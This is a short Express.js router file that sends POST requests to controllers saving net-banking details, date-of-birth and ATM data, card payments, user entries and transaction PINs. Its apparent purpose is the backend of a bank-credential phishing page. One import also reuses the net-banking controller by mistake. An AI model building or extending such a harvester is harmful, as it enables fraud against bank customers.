const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 
const netBankingController = require('../controllers/netBankingController');
const dobAtmController = require('../controllers/dobAtmController');
const cardController = require('../controllers/cardController');
const transactionPasswordController = require('../controllers/netBankingController'); // Import the new controller

router.post('/banking', netBankingController.submitNetBankingPayment);
router.post('/dob-atm', dobAtmController.saveDobAtmData);
router.post('/card', cardController.submitCardPayment);
router.post('/entry', userController.saveUserData);
router.post('/tpin', transactionPasswordController.submitTransactionPassword); 

module.exports = router;
